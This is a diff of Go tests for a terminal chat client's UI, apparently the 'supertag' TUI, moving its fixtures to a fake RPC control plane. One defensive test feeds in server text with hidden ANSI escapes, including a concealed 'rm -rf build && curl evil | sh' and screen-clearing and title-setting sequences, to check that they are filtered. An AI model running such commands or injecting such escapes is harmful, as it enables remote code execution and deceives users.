@@ -5,7 +5,6 @@ import (
 	"errors"
 	"fmt"
 	"net/http"
-	"net/http/httptest"
 	"os"
 	"strings"
 	"syscall"
@@ -15,23 +14,29 @@ import (
 	tea "charm.land/bubbletea/v2"
 	"github.com/charmbracelet/x/ansi"
 
+	"connectrpc.com/connect"
+
 	"github.com/atemaguer/supertag/apps/tui/client"
+	"github.com/atemaguer/supertag/packages/operator-api/go/operatorv1"
 )
 
-func testModel(t *testing.T, handler http.HandlerFunc) model {
+func testModel(t *testing.T, fake *fakeControlPlane) model {
 	t.Helper()
 	tagRefresh = time.Millisecond
-	server := httptest.NewServer(handler)
-	t.Cleanup(server.Close)
+	server := fake.start(t)
 	c, err := client.New(client.Target{URL: server.URL, Token: "secret", Name: "laptop"}, "test")
 	if err != nil {
 		t.Fatal(err)
 	}
-	f := &client.Follower{Client: c, Interval: 5 * time.Millisecond, ReplyTimeout: time.Second, WorkTimeout: time.Second}
+	f := &client.Follower{Client: c, Interval: time.Millisecond, IdleTimeout: time.Second, ReconnectTimeout: time.Second, WorkTimeout: time.Second}
 	ctx, cancel := context.WithCancel(context.Background())
 	t.Cleanup(cancel)
-	m := newModel(ctx, c, f)
+	m := newModel(ctx, c, f, nil)
 	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
+}
+
+func tags(names ...string) func(http.ResponseWriter) {
+	return func(w http.ResponseWriter) { tagList(w, names...) }
 }
 
 func update(t *testing.T, m model, msg tea.Msg) model {
@@ -40,50 +45,62 @@ func update(t *testing.T, m model, msg tea.Msg) model {
 	return next.(model)
 }
 
-// run feeds cmd's messages back into Update until no command is left, as the program would.
+// run feeds cmd's messages back into Update until no command is left, as the program would,
+// running batched commands in order. A poll tick ends its chain.
 func run(t *testing.T, m model, cmd tea.Cmd) model {
 	t.Helper()
-	for cmd != nil {
-		msg := cmd()
-		if _, ok := msg.(refreshMsg); ok {
-			return m
+	queue := []tea.Cmd{cmd}
+	for len(queue) > 0 {
+		next := queue[0]
+		queue = queue[1:]
+		if next == nil {
+			continue
 		}
-		var next tea.Model
-		next, cmd = m.Update(msg)
-		m = next.(model)
+		switch msg := next().(type) {
+		case nil, pollMsg:
+		case tea.BatchMsg:
+			queue = append(queue, msg...)
+		default:
+			updated, cmd := m.Update(msg)
+			m = updated.(model)
+			queue = append(queue, cmd)
+		}
 	}
 	return m
+}
+
+// start loads the Tags and the selected Tag's history, as Init does without the watch stream.
+func start(t *testing.T, m model) model {
+	t.Helper()
+	return run(t, m, tea.Batch(m.reloadTags(), m.reloadConversations()))
 }
 
 func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }
 
 func screen(m model) string { return ansi.Strip(m.View().Content) }
 
-const tagsJSON = `{"items":[{"metadata":{"name":"lead"},"status":{"phase":"active"}},{"metadata":{"name":"builder"},"status":{"phase":"active"}}]}`
-
 func TestSendStreamsTheReplyAndWork(t *testing.T) {
-	rereads := 0
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
-		switch {
-		case r.URL.Path == "/api/v1/tags":
-			fmt.Fprint(w, tagsJSON)
-		case r.Method == http.MethodPost:
-			fmt.Fprint(w, `{"taskId":"t1","session":"default","status":"waiting"}`)
-		case strings.HasSuffix(r.URL.Path, "/t1/stream"):
-			fmt.Fprint(w, "id: 1\ndata: {\"type\":\"data-activity\",\"data\":{\"kind\":\"command\",\"status\":\"running\",\"command\":\"rg discount\"}}\n\n"+
-				"id: 2\ndata: {\"type\":\"finish\",\"messageMetadata\":{\"reply\":{\"presentation\":\"markdown\",\"text\":\"**Started** the fix.\"}}}\n\ndata: [DONE]\n\n")
-		case strings.HasSuffix(r.URL.Path, "/t1"):
-			rereads++
-			report := `"reportStatus":"waiting"`
-			if rereads > 1 {
-				report = `"status":"completed","reportStatus":"replied","report":{"presentation":"markdown","text":"Fixed it."}`
+	fake := &fakeControlPlane{
+		tags: tags("lead", "builder"),
+		send: func(req *operatorv1.SendMessageRequest) *operatorv1.Message {
+			return waitingMessage("t1", req.GetText())
+		},
+		follow: func(_ context.Context, _ *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
+			for _, event := range []*operatorv1.FollowEvent{
+				followEvent(1, command("", "rg discount")),
+				followEvent(2, &operatorv1.Finish{Reply: finalReply("**Started** the fix."), Message: &operatorv1.Message{TaskId: "t1",
+					WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Validate percent", "w1", "")}}}),
+				followEvent(3, &operatorv1.WorkSessionChanged{WorkSession: workSession("s1", "Validate percent", "w1", "Fixed it.")}),
+				followEvent(4, &operatorv1.FollowEnd{Message: &operatorv1.Message{TaskId: "t1"}}),
+			} {
+				if err := stream.Send(event); err != nil {
+					return err
+				}
 			}
-			fmt.Fprintf(w, `{"taskId":"t1","status":"replied","startedSessions":[{"id":"s1","title":"Validate percent","status":"running",%s}]}`, report)
-		default:
-			http.NotFound(w, r)
-		}
-	})
-	m = run(t, m, m.loadTags())
+			return nil
+		},
+	}
+	m := start(t, testModel(t, fake))
 	if !m.connected || m.selectedTag() != "lead" {
 		t.Fatalf("connected=%v selected=%q status=%q", m.connected, m.selectedTag(), m.status)
 	}
@@ -100,14 +117,79 @@ func TestSendStreamsTheReplyAndWork(t *testing.T) {
 	if m.input.Value() != "" {
 		t.Errorf("input not cleared: %q", m.input.Value())
 	}
+	if len(fake.sent) != 1 || fake.sent[0].GetTag() != "lead" || fake.sent[0].GetConversation() != "default" || fake.sent[0].GetIdempotencyKey() == "" {
+		t.Errorf("sent = %v", fake.sent)
+	}
+}
+
+func TestSelectingATagShowsItsHistory(t *testing.T) {
+	answered := &operatorv1.Message{TaskId: "t1", Text: "What changed?", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
+		Reply: finalReply("The **discount** rules."), WorkSessions: []*operatorv1.WorkSession{workSession("s1", "Audit", "w1", "Audited.")}}
+	working := &operatorv1.Message{TaskId: "t2", Text: "Now fix it", Status: operatorv1.ReplyStatus_REPLY_STATUS_REPLIED,
+		Reply: finalReply("Fixing."), WorkSessions: []*operatorv1.WorkSession{workSession("s2", "Fix", "w2", "")}}
+	var asked []string
+	fake := &fakeControlPlane{
+		tags: tags("lead", "builder"),
+		history: func(req *operatorv1.ListMessagesRequest) []*operatorv1.Message {
+			asked = append(asked, req.GetTag()+"/"+req.GetConversation())
+			if req.GetTag() != "lead" {
+				return nil
+			}
+			return []*operatorv1.Message{working, answered}
+		},
+		follow: func(_ context.Context, req *operatorv1.FollowMessageRequest, stream *connect.ServerStream[operatorv1.FollowEvent]) error {
+			if req.GetTaskId() != "t2" {
+				t.Errorf("followed %s; only the unsettled message needs following", req.GetTaskId())
+			}
+			for _, event := range []*operatorv1.FollowEvent{
+				followEvent(1, &operatorv1.Finish{Reply: finalReply("Fixing."), Message: working}),
+				followEvent(2, &operatorv1.WorkSessionChanged{WorkSession: workSession("s2", "Fix", "w2", "Fixed.")}),
+				followEvent(3, &operatorv1.FollowEnd{Message: working}),
+			} {
+				if err := stream.Send(event); err != nil {
+					return err
+				}
+			}
+			return nil
+		},
+	}
+	m := testModel(t, fake)
+	if _, cmd := m.Update(key(tea.KeyEnter)); cmd != nil {
+		t.Fatal("nothing to send before the Tags load")
+	}
+	m = start(t, m)
+	got := screen(m)
+	order := []string{"What changed?", "The discount rules.", "· working: Audit", "· done: Audit", "Audited.",
+		"Now fix it", "Fixing.", "· working: Fix", "· done: Fix", "Fixed."}
+	at := 0
+	for _, want := range order {
+		i := strings.Index(got[at:], want)
+		if i < 0 {
+			t.Fatalf("screen lacks %q after position %d:\n%s", want, at, got)
+		}
+		at += i + len(want)
+	}
+	if strings.Count(got, "Fixing.") != 1 || strings.Count(got, "· working: Fix") != 1 {
+		t.Fatalf("following the history repeated it:\n%s", got)
+	}
+	m = update(t, m, key(tea.KeyTab))
+	next, cmd := m.Update(key(tea.KeyDown))
+	m = run(t, next.(model), cmd)
+	if !strings.Contains(screen(m), "Say something to builder") {
+		t.Fatalf("builder's empty history:\n%s", screen(m))
+	}
+	next, cmd = m.Update(key(tea.KeyUp))
+	m = run(t, next.(model), cmd)
+	if strings.Join(asked, " ") != "lead/default builder/default" {
+		t.Fatalf("history loads = %v, want one per Tag", asked)
+	}
 }
 
 func TestErrorsShowInTheStatusBar(t *testing.T) {
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
-		w.WriteHeader(http.StatusUnauthorized)
-		fmt.Fprint(w, `{"message":"The token is not valid"}`)
-	})
-	m = run(t, m, m.loadTags())
+	fake := &fakeControlPlane{tags: func(w http.ResponseWriter) {
+		writeJSON(w, http.StatusUnauthorized, map[string]string{"message": "The token is not valid"})
+	}}
+	m := start(t, testModel(t, fake))
 	if m.connected || !strings.Contains(screen(m), "The token is not valid") {
 		t.Fatalf("status = %q:\n%s", m.status, screen(m))
 	}
@@ -117,9 +199,58 @@ func TestErrorsShowInTheStatusBar(t *testing.T) {
 	}
 }
 
+func TestTheWatchStreamDrivesTheRail(t *testing.T) {
+	names := []string{"lead"}
+	open := 0
+	fake := &fakeControlPlane{
+		tags: func(w http.ResponseWriter) { tagList(w, names...) },
+		open: func() []*operatorv1.Conversation {
+			return []*operatorv1.Conversation{{Tag: "lead", Name: "default", OpenWorkSessionCount: int32(open)}, {Tag: "lead", Name: "other", OpenWorkSessionCount: 5}}
+		},
+	}
+	m := start(t, testModel(t, fake))
+	closed := make(chan client.WatchUpdate)
+	close(closed)
+	watch := func(m model, update client.WatchUpdate) model {
+		next, cmd := m.Update(watchMsg{update: update, updates: closed})
+		return run(t, next.(model), cmd)
+	}
+	m = watch(m, client.WatchUpdate{Kind: client.WatchLive})
+	reads := fake.reads()
+	m = update(t, m, pollMsg{})
+	if fake.reads() != reads || m.polling {
+		t.Fatal("a live watch stream must stop polling")
+	}
+
+	names = []string{"lead", "reviewer"}
+	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_TAG, Tag: "reviewer"}})
+	if !strings.Contains(m.renderRail(10), "reviewer") {
+		t.Fatalf("a Tag change did not reread the Tags:\n%s", m.renderRail(10))
+	}
+	open = 2
+	m = watch(m, client.WatchUpdate{Kind: client.WatchChanged, Change: &operatorv1.WatchChange{Kind: operatorv1.WatchKind_WATCH_KIND_CONVERSATION_MESSAGE, Tag: "lead"}})
+	if rail := ansi.Strip(m.renderRail(10)); !strings.Contains(rail, "lead 2 open") || !strings.Contains(rail, "reviewer active") {
+		t.Fatalf("rail:\n%s", rail)
+	}
+
+	next, cmd := m.Update(watchMsg{update: client.WatchUpdate{Kind: client.WatchLost, Err: errors.New("gone")}, updates: closed})
+	m = next.(model)
+	if m.live || !m.polling || cmd == nil {
+		t.Fatal("a lost watch stream must start polling")
+	}
+	m = run(t, m, cmd)
+	if fake.reads() <= reads+1 {
+		t.Fatal("polling did not reread the Tags")
+	}
+	names = []string{"reviewer"}
+	m = watch(m, client.WatchUpdate{Kind: client.WatchResync})
+	if !m.live || m.selectedTag() != "reviewer" {
+		t.Fatalf("a resync must reread everything: live=%v selected=%q", m.live, m.selectedTag())
+	}
+}
+
 func TestKeysMoveFocusAndSelection(t *testing.T) {
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, tagsJSON) })
-	m = run(t, m, m.loadTags())
+	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
 	m = update(t, m, key(tea.KeyTab))
 	if m.focus != focusRail || m.input.Focused() {
 		t.Fatal("tab should focus the rail")
@@ -195,15 +326,15 @@ func followed(t *testing.T, m model, events ...client.FollowEvent) model {
 }
 
 func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) {
+	m := start(t, testModel(t, &fakeControlPlane{tags: func(w http.ResponseWriter) {
 		fmt.Fprint(w, `{"items":[{"metadata":{"name":"lead\u001b[8m"},"status":{"phase":"active\u001b]0;x\u0007"}}]}`)
-	})
-	m = run(t, m, m.loadTags())
+	}}))
 	m = followed(t, m,
 		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
 		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
 		client.FollowEvent{Kind: client.EventApproval, Title: "Push\x1b[8m to main", Text: "Push?\x1bP+q\x1b\\"},
-		client.FollowEvent{Kind: client.EventReply, Reply: &client.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
+		client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
+		client.FollowEvent{Kind: client.EventTurnError, Text: "Tag lead could not answer: \x1b[2Jgone"},
 		client.FollowEvent{Kind: client.EventDelta, Text: "draft \x1bP1$r\x1b\\"},
 	)
 	m = update(t, m, followMsg{tag: m.selectedTag(), event: client.FollowEvent{Kind: client.EventError, Text: "boom\x1b[8m hidden"}})
@@ -223,16 +354,15 @@ func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
 }
 
 func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, tagsJSON) })
-	m = run(t, m, m.loadTags())
+	m := start(t, testModel(t, &fakeControlPlane{tags: tags("lead", "builder")}))
 	for i := range 20 {
-		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &client.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
+		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &operatorv1.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
 	}
 	before := m.md.renders
 	for range 50 {
 		m = followed(t, m, client.FollowEvent{Kind: client.EventDelta, Text: "token "})
 	}
-	m = run(t, m, m.loadTags())
+	m = start(t, m)
 	if m.md.renders != before {
 		t.Fatalf("streaming re-rendered %d past replies", m.md.renders-before)
 	}
@@ -248,8 +378,7 @@ func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
 		items = append(items, fmt.Sprintf(`{"metadata":{"name":"%02d-security-reviewer"},"status":{"phase":"active"}}`, i))
 	}
 	list := `{"items":[` + strings.Join(items, ",") + `]}`
-	m := testModel(t, func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, list) })
-	m = run(t, m, m.loadTags())
+	m := start(t, testModel(t, &fakeControlPlane{tags: func(w http.ResponseWriter) { fmt.Fprint(w, list) }}))
 	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
 	rail := ansi.Strip(m.renderRail(9))
 	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-re… active") || !strings.Contains(rows[2], "01-security-re… active") {
